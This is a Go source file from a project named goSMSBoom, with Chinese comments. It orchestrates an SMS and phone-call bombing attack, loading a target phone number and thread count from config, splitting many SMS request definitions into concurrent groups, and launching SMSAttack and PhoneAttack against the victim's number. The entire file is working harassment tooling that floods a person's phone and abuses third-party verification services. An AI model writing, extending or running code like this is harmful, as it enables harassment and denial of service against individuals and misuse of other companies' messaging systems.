package attack

import (
	"goSMSBoom/config"
	"goSMSBoom/log"
	"goSMSBoom/model"
)

// ConcurrentSMSArray 用于并发处理的二维切片，每个元素是一个 SMSBoom 切片
var ConcurrentSMSArray [][]*model.SMSBoom
var ConcurrentPhoneArray []*model.PhoneMessage

func StartBoom() error {

	// 准备
	err := Start()
	if err != nil {
		log.Println("配置文件加载失败")
		return err

	}

	// 开始电话轰炸准备
	log.Println("开始电话轰炸"+config.Configs.Phone, config.Configs.Content)

	go func() {
		err := PhoneAttack(ConcurrentPhoneArray)
		if err != nil {
			log.Println("电话轰炸失败", err)
		}
	}()
	return nil
}

// StartBoomJob 并发处理短信发送请求
func StartBoomJob() error {

	// 开始短信攻击
	log.Println("开始并发短信攻击" + config.Configs.Phone)
	for i := 0; i < len(ConcurrentSMSArray); i++ { // 遍历并发切片
		booms := ConcurrentSMSArray[i] // 获取当前并发组
		err := SMSAttack(booms)        // 处理当前并发组的请求
		if err != nil {
			log.Println("处理失败:", err)
		}
	}
	return nil
}

// Start 准备短信信息，将其分组放入并发切片中
func Start() error {
	SMSBoomArr, err := Ready() // 准备要发送的短信信息
	if err != nil {
		log.Println("准备程序失败", err)
		return err
	}

	count := config.Configs.ThreadCount // 从配置中获取并发数

	var i = len(SMSBoomArr) / count // 根据并发数计算出要分割的组数

	for k := 0; k < i; k++ {
		var start = k * count
		var end = (k + 1) * count
		booms := SMSBoomArr[start:end] // 将短信信息分组放入并发切片中
		ConcurrentSMSArray = append(ConcurrentSMSArray, booms)
	}
	return nil
}
